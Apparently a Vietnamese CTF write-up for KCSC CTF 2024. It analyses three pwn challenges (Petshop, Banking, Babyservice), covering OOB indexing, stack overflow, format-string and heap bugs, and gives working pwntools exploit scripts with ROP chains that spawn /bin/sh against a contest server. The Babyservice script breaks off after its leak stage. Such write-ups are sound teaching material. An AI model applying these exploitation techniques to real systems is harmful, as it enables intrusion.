# KCSC CTF 2024

## Petshop

### Phân tích chương trình

* Chương trình có `3` chức năng `buy`, `sell`, `info`

![Screenshot 2024-05-13 153000](https://hackmd.io/_uploads/SkYhyIJXC.png)

* `buy`

![Screenshot 2024-05-13 153119](https://hackmd.io/_uploads/SyLklIJQ0.png)

* Từ truy vấn của người dùng lấy ra `1` string và `1` số
* String này buộc phải là `cat` hoặc `dog`
* `num` là index để lấy tên của `cat` hoặc `dog` trong `2` mảng `cats` và `dogs`

![Screenshot 2024-05-13 153358](https://hackmd.io/_uploads/HJmKxIkXR.png)

* Biến `num` ở đây là `int` nên có thể truyền tham số âm để bypass check --> `OOB`
* Struct của `pet` được lưu trong `pet_list`

![Screenshot 2024-05-13 153505](https://hackmd.io/_uploads/ry3Cx8kmR.png)

* Chỉ là `2` string

* `sell`

![Screenshot 2024-05-13 153623](https://hackmd.io/_uploads/Hk9GWI1X0.png)

* Nó nhận tham số là index để clear phần tử trong `pet_list`
* Sau đó nó yêu cầu nhập `size` và dùng `size` đó cho hàm `fgets` bên dưới với `1` stack buffer

![Screenshot 2024-05-13 153647](https://hackmd.io/_uploads/ryndWLk7R.png)

* Lệnh `checksec` thì mình thấy nó không có canary thì mình đã nghĩ là bug stack overflow rồi và nhìn hàm `sell` rõ là có vấn đề nên mình nghĩ bug chỉ có thể ở đây thôi
* Tuy vậy không thể bypass check bằng cách cho `n < 0` được
* Ở đây ta thấy nó cần có điều kiện là `scanf` phải trả về `1` nữa, nên nếu `scanf` fail và trả về `0` thì sẽ bypass được
* Mình chỉ cần đưa vào `1` ký tự không phải số chẳng hạn `aaaa` thì `scanf` sẽ trả về `0` và `n` sẽ vẫn là `1` gíá trị rác trên stack vì nó không được khởi tạo --> stack overflow

* `info`

![Screenshot 2024-05-13 154150](https://hackmd.io/_uploads/ByALfIk70.png)

* Chỉ đơn giản là in hết tất cả trong `pet_list` hoặc `cats`, `dogs`

### Khai thác
* Từ bug `OOB` thì mình có thể dùng để leak
* Ở trước `cats` và `dogs` có `1` con trỏ trỏ đến chính nó là `1` địa chỉ binary

![Screenshot 2024-05-13 154302](https://hackmd.io/_uploads/SJshf8kQA.png)

* Từ đó thì mình có binary rồi thì build rop chain nữa là được


![Screenshot 2024-05-13 154717](https://hackmd.io/_uploads/rJSsQ81XA.png)

```py=
#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('petshop')
libc = ELF('libc-2.31.so')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')

def buy(type, idx_name, name):
    sla(b'-->', b'buy ' + type + b' ' + str(idx_name).encode())
    sla(b'name?', name)
def sell(idx, size, reason = None):
    sla(b'-->', b'sell ' + str(idx).encode())
    sla(b'reason', str(size).encode())
    if reason != None:
        sla(b'reason', reason)

def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *(sell + 245)
               b *(sell + 367)
               b buy
               c
               ''')


#context.log_level = 'debug'
#p = process()
p = remote('103.163.24.78', 10001)
buy(b'dog', -6, b'hihih')
sla(b'-->', b'info mine')
ru(b'pets:')
ru(b'1. ')
leak = rl()[:-1]
leak = int_from_bytes(leak)
elf.address = leak - 0x4008
POP_RDI = 0x0000000000001a13 + elf.address#: pop rdi ; ret
POP_R15 = 0x0000000000001a11 + elf.address#pop rsi ; pop r15 ret



print('elf: ', hex(elf.address))
print('leak: ', hex(leak))
sell(0, 0x1000)
buy(b'dog', 1, b'\x0f'*0x3f0)
sla(b'-->', b'sell 1')

payload = flat(
    POP_RDI, 
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
sla(b'reason?', b'a'*0x209 + payload)
ru(b'sonable!\n')
leak = rl()[:-1]
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['puts']
print('libc: ', hex(libc.address))
#GDB(p)

buy(b'dog', 1, b'\x0f'*0x3f0)
sla(b'-->', b'sell 2')
payload = flat(
    POP_RDI,
    next(libc.search(b'/bin/sh')),
    POP_RDI + 1,
    libc.symbols['system']
)
sla(b'reason?', b'a'*0x209 + payload)

#sla(b'reason', b'A'*0x500)




#KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}
p.interactive()
```

## Banking

### Phân tích chương trình

* Ban đầu chương trình cho `3` option

![Screenshot 2024-05-13 154750](https://hackmd.io/_uploads/BkFRmL1m0.png)

* `login`

![Screenshot 2024-05-13 154848](https://hackmd.io/_uploads/ry4-V8JX0.png)

* Nó check `account` và `password` dựa trên `2` biến global và nếu thỏa mãn thì trả về `true`
* `reg` là nơi chúng ta set giá trị `2` biến này

![Screenshot 2024-05-13 154945](https://hackmd.io/_uploads/BkLrE8JQC.png)

* Sau khi login chúng ta có `4` option

![Screenshot 2024-05-13 155020](https://hackmd.io/_uploads/B1QPVIkmR.png)

* `Deposit`

![Screenshot 2024-05-13 155049](https://hackmd.io/_uploads/Bk1Y4U1X0.png)

* Người dùng nhập `1` số và cộng vào biến `money`
* `withdraw`

![Screenshot 2024-05-13 155131](https://hackmd.io/_uploads/HJjiNLJXA.png)

* Người dùng nhập `1` số và trừ khỏi `money` nếu số đó bé hơn `money`
* `info` 

![Screenshot 2024-05-13 155216](https://hackmd.io/_uploads/BJpTELyXR.png)

* Ta thấy được ngay bug `format string`

### Khai thác

* Ở đây là bug format string với `1` biến global nên mình phải tìm `1` giá trị stack trỏ đến `1` giá trị stack khác để overwrite địa trỉ trả về của `main`

![Screenshot 2024-05-13 155626](https://hackmd.io/_uploads/BkApr8yQR.png)

* Địa chỉ `0x00007ffeceaae790` ở `0x7ffeceaae6b0` trỏ đến `0x00007ffeceaae8e8` với `2` offset tương ứng trong format string là `13` và `40`
* Từ đó thì mình build rop chain thôi

![Screenshot 2024-05-13 155423](https://hackmd.io/_uploads/SJ1m8Lym0.png)

```py=
#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('banking')
libc = ELF('libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def reg(name, pw, fullname):
    sla(b'>', b'2')
    sla(b'name', name)
    sla(b'word', pw)
    sla(b'name', fullname)
    sla(b'>', b'1')
    sla(b'name', name)
    sla(b'word', pw)
def info():
    sla(b'>', b'3')
def logout():
    sla(b'>', b'4')
def gen_fmstr(addr, value):
    payload = b''
    if addr & 0xffff != 0:
        payload += b'%' + str(addr & 0xffff).encode() + b'c'
    payload += b'%13$hn'
    tmp = addr & 0xff
    if tmp > value:
        need = value + 0x100 - tmp
    else:
        need = value - tmp
    payload += b'%' + str(need).encode() + b'c' + b'%40$lln'
    return payload
def fmstr(offset, value):
    if value != 0:
        payload = f'%{value}c%{offset}$hn'.encode()
    else:
        payload = b'hihi'
    return payload
def GDB(proc):
    gdb.attach(p, gdbscript='''
               b info
               b *(main + 84)
               c
               ''')
#context.log_level = 'debug'
p = process()
#p = remote('103.163.24.78', 10002)
reg(b'nao', b'nao', b'%p|'*0x10)
info()
ru(b'|')
leak = ru(b'|')[:-1]
leak = int(leak.decode(), 16)
print('leak: ', hex(leak))
libc.address = leak - 0x1f6b24
print('libc: ', hex(libc.address))
for i in range(3):
    ru(b'|')
leak = ru(b'|')[:-1]
leak = int(leak.decode(), 16)
print('leak: ', hex(leak))
stack_main = leak + 0x28
print('stack: ', hex(stack_main))

GDB(p)

logout()
sla(B'eedback:', b'hihi')
reg(b'nao', b'nao', b'%13$p|%40$p')
info()
RET = 0x00000000000b9ba9 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
rop.raw(RET)
rop.system(next(libc.search(b'/bin/sh\x00')))
rop = rop.chain()
print(rop)
for i in range(len(rop)):
    logout()
    sla(B'eedback:', b'hihi')
    pl = fmstr(13, stack_main & 0xffff)
    reg(b'nao', b'nao', pl)
    info()
    logout()
    sla(B'eedback:', b'hihi')
    pl = fmstr(40, rop[i])
    reg(b'nao', b'nao', pl)
    info()
    stack_main += 1
logout()
sl(b'hihi')
sla(b'>', b'3')

#KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}


p.interactive()
```

## Babyservice

* Bài này thì mình không giải kịp trước khi kết thúc giải nhưng thôi cứ viết writeup vậy 

![353046855_663734792237703_1475682602241096410_n](https://hackmd.io/_uploads/S1CFUL1QC.jpg)

### Phân tích chương trình

* Khởi đầu hàm `main` có gọi vài hàm để setup
![Screenshot 2024-05-13 160108](https://hackmd.io/_uploads/SJxxDLJXA.png)

* Hàm `create_pipe`

```cpp=
unsigned __int64 create_pipe()
{
  int pipedes[2]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(14, (__sighandler_t)handler);
  output = (char *)malloc(0x10000uLL);
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 1!");
    exit(1);
  }
  fd1_read = pipedes[0];
  fd1_write = pipedes[1];
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 2!");
    exit(1);
  }
  fd2_read = pipedes[0];
  fd2_write = pipedes[1];
  arg_1_2 = (arg_struct *)malloc(8uLL);
  arg_1_2->read = fd1_read;
  arg_1_2->write = fd2_write;
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 1!");
    exit(1);
  }
  fd3_read = pipedes[0];
  fd3_write = pipedes[1];
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 2!");
    exit(1);
  }
  fd4_read = pipedes[0];
  fd4_write = pipedes[1];
  arg3_4 = (arg_struct *)malloc(8uLL);
  arg3_4->read = fd3_read;
  arg3_4->write = fd4_write;
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 1!");
    exit(1);
  }
  fd5_read = pipedes[0];
  fd5_write = pipedes[1];
  if ( pipe(pipedes) < 0 )
  {
    puts("[-] Failed to create pipe 2!");
    exit(1);
  }
  fd6_read = pipedes[0];
  fd6_write = pipedes[1];
  arg5_6 = (arg_struct *)malloc(8uLL);
  arg5_6->read = fd5_read;
  arg5_6->write = fd6_write;
  pthread_create(&newthread, 0LL, (void *(*)(void *))routine1, arg_1_2);
  pthread_create(&thread2, 0LL, (void *(*)(void *))routine2, arg3_4);
  pthread_create(&thread3, 0LL, (void *(*)(void *))routine3, arg5_6);
  return __readfsqword(0x28u) ^ v2;
}
```

* Hàm này khởi tạo các `pipe`, các `pipe` này tương ứng là để tương tác với `3` thread `routine1`, `routine2`, `routine3`
* Hàm `create_socket` chỉ khởi tạo `socket`
* Chương trình nhận `request` qua port `8888`

![Screenshot 2024-05-13 160411](https://hackmd.io/_uploads/H1siwLJ7C.png)

* `4` bytes đầu của `request` đầu tiên là option để chúng ta tương tác với `3` thread tương ứng
* Hàm `read_one`

![Screenshot 2024-05-13 160546](https://hackmd.io/_uploads/r13l_8ymA.png)

* Nó sẽ đọc tới max là `0x10000` và `realloc` chunk chứa `input` của người dùng và trả về `size` của `request`
* Hàm `handle_req`

```cpp=
size_t handle_req()
{
  size_t result; // rax
  char *v1; // rax
  char *v2; // rax

  if ( request == 3 )
  {
    write_to_fd((unsigned int)fd5_write, input, (unsigned int)size_so_far);
    read_to_chunk((unsigned int)fd6_read, output, &size_glob_read6);
    result = (unsigned int)size_glob_read6;
    if ( size_glob_read6 )
      return result;
    goto err;
  }
  if ( (unsigned int)request <= 3 )
  {
    if ( request == 1 )
    {
      write_to_fd((unsigned int)fd1_write, input, (unsigned int)size_so_far);
      read_to_chunk((unsigned int)fd2_read, output, &size_glob_read6);
      result = (unsigned int)size_glob_read6;
      if ( size_glob_read6 )
        return result;
    }
    else
    {
      if ( request != 2 )
        goto invalid;
      write_to_fd((unsigned int)fd3_write, input, (unsigned int)(size_so_far - 4));
      read_to_chunk((unsigned int)fd4_read, output, &size_glob_read6);
      result = (unsigned int)size_glob_read6;
      if ( size_glob_read6 )
        return result;
    }
err:
    v1 = output;
    *(_QWORD *)output = 0x6F206F4E205D2A5BLL;
    strcpy(v1 + 8, "utput\n");
    result = strlen(output);
    size_glob_read6 = result;
    return result;
  }
invalid:
  v2 = output;
  *(_QWORD *)output = 0x61766E49205D2D5BLL;
  strcpy(v2 + 8, "lid function\n");
  result = strlen(output);
  size_glob_read6 = result;
  return result;
}
```

* Đơn giản là chuyển `request` của chúng ta cho các thread tương ứng
* Thread `routine1`, thread này xử lí `brainfuck`

```cpp=
void __fastcall __noreturn start_routine(arg_struct *arg_1_2)
{
  void *buf; // [rsp+18h] [rbp-18h]
  struct pollfd fds; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  input_routine1 = malloc(0x1000uLL);
  while ( 1 )
  {
    fds.fd = arg_1_2->read;
    fds.events = 1;
    if ( poll(&fds, 1uLL, -1) == -1 )
      break;
    if ( (fds.revents & 1) != 0 )
    {
      LODWORD(nbytes_routine1) = 0;
      memset(input_routine1, 0, 0x1000uLL);
      read(arg_1_2->read, &nbytes_routine1, 4uLL);
      if ( (unsigned int)nbytes_routine1 <= 0x1000 )
      {
        read(arg_1_2->read, input_routine1, (unsigned int)nbytes_routine1);
        if ( (unsigned int)check_haystack() )
        {
          handle1();
          write_to_chunk((unsigned int)arg_1_2->write, chunk_routine1_output, (unsigned int)size);
        }
        else
        {
          write_to_chunk((unsigned int)arg_1_2->write, "[-] Invalid format!\n", 20LL);
        }
        free_output_reset();
      }
      else
      {
        buf = malloc(0x10000uLL);
        read(arg_1_2->read, buf, (unsigned int)nbytes_routine1);
        memset(buf, 0, 0x10000uLL);
        free(buf);
        write_to_chunk((unsigned int)arg_1_2->write, "[-] Size too large!\n", 20LL);
        free_output_reset();
      }
    }
  }
  perror("[-] poll failed");
  exit(0);
}
```
* Hàm `checkhaystack`

![Screenshot 2024-05-13 160917](https://hackmd.io/_uploads/rkOCuLyQ0.png)

![Screenshot 2024-05-13 160923](https://hackmd.io/_uploads/BJ2AdIyXR.png)

* Vậy input của người dùng chỉ có thể bao gồm `+-<>[].,`
* Hàm xử lí `handle1`

```cpp=
unsigned __int64 sub_221C()
{
  signed int i_1; // [rsp+8h] [rbp-1018h]
  unsigned int i; // [rsp+Ch] [rbp-1014h]
  __int64 buf[513]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, 4096);
  i_1 = 0;
  for ( i = 0; (unsigned int)nbytes_routine1 > i && input_routine1[i]; ++i )
  {
    switch ( input_routine1[i] )
    {
      case '+':
        if ( (unsigned int)i_1 <= 0xFFF )
          ++*((_BYTE *)buf + i_1);
        break;
      case '-':
        if ( (unsigned int)i_1 <= 0xFFF )
          --*((_BYTE *)buf + i_1);
        break;
      case '.':
        if ( (unsigned int)size <= 0x1000 )
        {
          LODWORD(size) = size + 1;
          chunk_routine1_output = realloc(chunk_routine1_output, (unsigned int)size);
          *((_BYTE *)chunk_routine1_output + (unsigned int)(size - 1)) = *((_BYTE *)buf + i_1);
        }
        break;
      case '<':
        --i_1;
        break;
      case '>':
        ++i_1;
        break;
      case '[':
        if ( !*((_BYTE *)buf + i_1) )
        {
          do
            ++i;
          while ( input_routine1[i] != ']' );
        }
        break;
      case ']':
        do
          --i;
        while ( input_routine1[i + 1] != '[' );
        break;
      default:
        continue;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```
* Ở đây ta thấy `.` ghi vào `output` thì không check biến `i_1` mà chỉ check `size` nên có thể `OOB` để leak chứ không thể ghi
* Đó là tất cả mình thấy ở thread này
* Thread `routine2` là thread xử lí `base64` encode và decode

```cpp=
void __fastcall __noreturn routine2(arg_struct *a1)
{
  _BYTE *v1; // rbx
  unsigned __int16 size; // [rsp+16h] [rbp-2Ah]
  __int64 size_1; // [rsp+18h] [rbp-28h] BYREF
  struct pollfd fds; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  while ( 1 )
  {
    fds.fd = a1->read;
    fds.events = 1;
    if ( poll(&fds, 1uLL, -1) == -1 )
      break;
    if ( (fds.revents & 1) != 0 )
    {
      opcode = 0;
      size_routine2_input = 0;
      input_buf_routine2 = 0LL;
      read(a1->read, &size_routine2_input, 4uLL);
      size = size_routine2_input + 1;
      if ( (unsigned __int16)(size_routine2_input + 1) <= 0x400u )
      {
        input_buf_routine2 = malloc(size);
        read(a1->read, &opcode, 4uLL);
        v1 = input_buf_routine2;
        v1[read(a1->read, input_buf_routine2, (unsigned __int16)(size - 1))] = 0;
        if ( (unsigned int)opcode < 2 )
        {
          if ( opcode )
          {
            if ( opcode == 1 )
              out_routine2 = (void *)encode(input_buf_routine2, &size_1);
          }
          else
          {
            out_routine2 = (void *)decode(input_buf_routine2, &size_1, (unsigned int)a1->write);
          }
          if ( out_routine2 )
          {
            write_to_chunk(a1->write, out_routine2, size_1);
            free(out_routine2);
          }
          free(input_buf_routine2);
          out_routine2 = 0LL;
          input_buf_routine2 = 0LL;
        }
        else
        {
          write_to_chunk(a1->write, "[-] Invalid function!\n", 0x16u);
        }
      }
      else
      {
        write_to_chunk(a1->write, "[-] Invalid size!\n", 0x12u);
      }
    }
  }
  perror("[-] poll failed");
  exit(0);
}
```
* Ở hàm `encode` nhận địa chỉ của biến `size_1` và sẽ set biến này thành size của kết quả decode

![Screenshot 2024-05-13 161259](https://hackmd.io/_uploads/BJ8TtIy7A.png)

* Ấy vậy mà khi mà `decode` thì chương trình lại sử dụng lại giá trị đó

![Screenshot 2024-05-13 161417](https://hackmd.io/_uploads/rJOeqUy7A.png)

* Dẫn tới việc `OOB` trên heap
* Đoạn code overflow

![Screenshot 2024-05-13 161454](https://hackmd.io/_uploads/BylXcLJ7C.png)
* Cuối cùng là thread `routine3` là thực thi `shellcode`
* Thread này sử dụng `1` mảng `6` phần tử để mô phỏng thanh ghi

![Screenshot 2024-05-13 161634](https://hackmd.io/_uploads/S1RKqL170.png)
* Hàm thực thi `shellcode`

```cpp=
__int64 run_shellcode()
{
  __int64 v0; // rax
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rax
  unsigned __int64 v10; // rbx
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  __int64 v13; // rbx
  char v14; // al
  __int64 v15; // rax
  unsigned __int64 v16; // rbx
  char v17; // al
  unsigned __int64 v18; // rax
  __int64 v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rax
  __int64 v22; // rbx
  __int64 v23; // rax
  __int64 v24; // rax
  __int64 v25; // rbx
  __int64 v26; // rax
  char v27; // al
  __int64 size_1; // rbx
  const char *value_arr; // rax
  __int64 v30; // rbx
  const void *v31; // rax
  __int64 result; // rax
  unsigned int i; // [rsp+Ch] [rbp-14h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)count_routine3;
    if ( i >= count_routine3 )
      break;
    *(_DWORD *)opcode_routine3 = *(_DWORD *)&input_routine3[4 * i];
    if ( opcode_routine3[0] > 0x19u )
    {
      if ( opcode_routine3[0] == '\x7F' && get_value_arr(16) == 1 && get_value_arr(20) == 1 )
      {
        size_1 = (unsigned int)outsize_routine3;
        if ( (unsigned __int64)(size_1 + get_value_arr(19)) <= 0xFFFF )
        {
          value_arr = (const char *)get_value_arr(21);
          open(value_arr, 0, 0LL);
          if ( *__errno_location() != 14 )
          {
            v30 = get_value_arr(19);
            v31 = (const void *)get_value_arr(21);
            memcpy(out_routine3, v31, v30);
            outsize_routine3 += get_value_arr(19);
          }
        }
      }
    }
    else if ( opcode_routine3[0] >= 0x10u )
    {
      switch ( opcode_routine3[0] )
      {
        case 0x10:
          if ( opcode_routine3[2] == '\x7F' )
          {
            set_glob_routine3(opcode_routine3[1], opcode_routine3[3]);
          }
          else
          {
            v0 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v0);
          }
          break;
        case 0x11:
          if ( opcode_routine3[2] == '\x7F' )
          {
            v3 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v3 + opcode_routine3[3]);
          }
          else
          {
            v1 = get_value_arr(opcode_routine3[1]);
            v2 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v1 + v2);
          }
          break;
        case 0x12:
          if ( opcode_routine3[2] == '\x7F' )
          {
            v6 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v6 - opcode_routine3[3]);
          }
          else
          {
            v4 = get_value_arr(opcode_routine3[1]);
            v5 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v4 - v5);
          }
          break;
        case 0x13:
          if ( opcode_routine3[2] == 127 )
          {
            v9 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v9 * opcode_routine3[3]);
          }
          else
          {
            v7 = get_value_arr(opcode_routine3[1]);
            v8 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v8 * v7);
          }
          break;
        case 0x14:
          if ( opcode_routine3[2] == '\x7F' )
          {
            v12 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v12 / opcode_routine3[3]);
          }
          else
          {
            v10 = get_value_arr(opcode_routine3[1]);
            v11 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v10 / v11);
          }
          break;
        case 0x15:
          if ( opcode_routine3[2] == '\x7F' )
          {
            v15 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v15 << opcode_routine3[3]);
          }
          else
          {
            v13 = get_value_arr(opcode_routine3[1]);
            v14 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v13 << v14);
          }
          break;
        case 0x16:
          if ( opcode_routine3[2] == 127 )
          {
            v18 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v18 >> opcode_routine3[3]);
          }
          else
          {
            v16 = get_value_arr(opcode_routine3[1]);
            v17 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v16 >> v17);
          }
          break;
        case 0x17:
          if ( opcode_routine3[2] == 127 )
          {
            v21 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v21 | opcode_routine3[3]);
          }
          else
          {
            v19 = get_value_arr(opcode_routine3[1]);
            v20 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v20 | v19);
          }
          break;
        case 0x18:
          if ( opcode_routine3[2] == 127 )
          {
            v24 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], v24 ^ opcode_routine3[3]);
          }
          else
          {
            v22 = get_value_arr(opcode_routine3[1]);
            v23 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v23 ^ v22);
          }
          break;
        case 0x19:
          if ( opcode_routine3[2] == 127 )
          {
            v27 = get_value_arr(opcode_routine3[1]);
            set_glob_routine3(opcode_routine3[1], (unsigned __int8)(v27 & opcode_routine3[3]));
          }
          else
          {
            v25 = get_value_arr(opcode_routine3[1]);
            v26 = get_value_arr(opcode_routine3[2]);
            set_glob_routine3(opcode_routine3[1], v26 & v25);
          }
          break;
        default:
          continue;
      }
    }
  }
  return result;
}
```

* `2` hàm `get_value_arr` và `set_value_arr` là đọc và ghi lên thanh ghi

```cpp=
__int64 __fastcall get_value_arr(int num)
{
  __int64 result; // rax
  int dec_time; // [rsp+14h] [rbp-4h]

  dec_time = 0;
  while ( num > 21 )
  {
    num -= 6;
    ++dec_time;
  }
  result = (unsigned int)(num - 16);
  switch ( num )
  {
    case 16:
      result = return_Arg1(arr_routine3[0], dec_time);
      break;
    case 17:
      result = return_Arg1(arr_routine3[1], dec_time);
      break;
    case 18:
      result = return_Arg1(arr_routine3[2], dec_time);
      break;
    case 19:
      result = return_Arg1(arr_routine3[3], dec_time);
      break;
    case 20:
      result = return_Arg1(arr_routine3[4], dec_time);
      break;
    case 21:
      result = return_Arg1(arr_routine3[5], dec_time);
      break;
    default:
      return result;
  }
  return result;
}
```

```cpp=
__int64 __fastcall return_Arg1(__int64 num, int dec_time)
{
  __int64 result; // rax

  if ( dec_time == 3 )
    return (unsigned __int8)num;
  if ( dec_time <= 3 )
  {
    if ( dec_time == 2 )
    {
      return (unsigned __int16)num;
    }
    else if ( dec_time )
    {
      if ( dec_time == 1 )
        return (unsigned int)num;
    }
    else
    {
      return num;
    }
  }
  return result;
}
```

* Dựa trên index mà lấy thanh ghi tương ứng và kiểu dữ liệu `1`, `2`, `4` hoặc `8` bytes
* Shellcode chủ yếu là thực hiện các phép toán giữa `2` số không có gì đặc biệt (chắc vậy 😓)
* Còn nữa là có thể mở `1` file bất kì

![Screenshot 2024-05-13 154636](https://hackmd.io/_uploads/B1mIJv17C.png)


* Mà mình cũng chả đụng gì đến thread này nên kệ vậy

### Khai thác

* Từ bug ở thread `brainfuck` để leak `elf`, `libc`. Mình có leak cả `stack` nữa nhưng cuối cùng cũng không để làm gì nhưng mà tại vì lười sửa script nên mình để kệ
* Ở thread `base64` mình sử dụng bug để overwrite tcache `0x25` thành `__free_hook`
* Trước hết là mình sử dụng bug đó để leak `heap base` của thread `2`
* Vì nó sẽ in ra theo cái `size` bị sử dụng lại nên lúc in sẽ bị in tràn. Dựa theo giá trị heap trên tcache của `0x25` để mình leak `heap` luôn
* Bài này mình setup heap rất nhiều để xây dựng ropchain vì không thể cứ gọi `one_gadget` vì sẽ không thể tương tác với chương trình qua `stdin`, `stdout` mà mình chỉ có oneshot gadget với `__free_hook`
* Khi trigger được hàm ở `__free_hook` mình check thông tin các thanh ghi xem có gì dùng được không

![Screenshot 2024-05-13 162851](https://hackmd.io/_uploads/BktP6I1XC.png)

![Screenshot 2024-05-13 162900](https://hackmd.io/_uploads/HkTvpIJQC.png)

* Chỉ có `rbx` là trỏ đến nơi mà mình có thể control được vì mấy giá trị kia trỏ đến chunk mà mình overwrite `__free_hook` mà mình overwrite với chunk `0x25` nên cũng không control được là bao
* Sau khi (rất lâu) mò mẫm gadgets thì mình đã có thể build được ropchain với các gadgets

```py=
CALL_RAX = 0x0000000000146e72 + libc.address#: mov rax, qword ptr [rbx + 0x20] ; mov rdi, rbp ; call qword ptr [rax + 0x20]
MOV_RDX = 0x000000000010d18b + libc.address #: mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]
MOV_RSP_RDX = 0x000000000005b4d0 + libc.address#: mov rsp, rdx ; ret
```
* Mình có thể controll được `[rbx + 0x20]`, nó là cái đoạn mà mình overwrite tcache `0x25`, mình set cho `rax` là `1` cái chunk trên heap mà mình setup sẵn để rồi set `rdx` rồi `pivot`
* Ban đầu mình sử dụng `reverse shell` nhưng mà có lẽ chương trình không có `python3` hay gì đó mà khi chạy trên server thì không được
* Mình phải `dup2` `socket` về `stdin`, `stdout` rồi chạy `system("/bin/sh")`

![Screenshot 2024-05-13 103749](https://hackmd.io/_uploads/HJUnR8JmA.png)

* Script mình xấu vì khi đó sắp hết giờ nên làm vội với mình cũng không sửa đoạn `reverse shell` nên hơi khó đọc
```py=
#!/usr/bin/python3
from pwn import *
import base64

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('chall')
libc = ELF('./glibc/libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def req1(data):
    sl(p32(1) + data)
def req2(size, type, data):
    sl(p32(2) + p32(type) + data)
def req3(size, data):
    sl(p32(3) + p32(size) + data)

def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *((void*)&stdout - 0x3bf2)
               b *((void*)&stdout - 0x3c3e) # option '.'
               b *((void*)&stdout - 0x406b) # read routine2
               b *((void*)&stdout - 0x2e82) # read routine3
             b *((void*)&stdout - 0x2ea1) # read size routine3
            b *((void*)&stdout - 0x3f72) # decode base64
            b *((void*)&stdout - 0x3fe0) # routine2
            b *((void*)&stdout - 0x43b9) # decode
            b *((void*)&stdout - 0x42ae) # malloc1
            b *((void*)&stdout - 0x4028) # malloc2
               b *((void*)&stdout - 0x455e)
               b *((void*)&stdout - 0x47d4) #decode
               c
               ''')


#context.log_level = 'debug'
p = remote('0', 8888)
#p = remote('103.163.24.78', 2907)

req1(b'<'*0x19 + b'>.'*8)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
elf.address = leak - 0x23fb
print('elf: ', hex(elf.address))

req1(b'<'*0x29 + b'>.'*8)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
stack = leak

req1(b'<'*0x6a + b'>.'*8 + b'+')
leak = r(8)
leak = int_from_bytes(leak)
leak = leak >> 8
print('leak: ', hex(leak))
libc.address = leak - 0x9b156
print('libc: ', hex(libc.address))


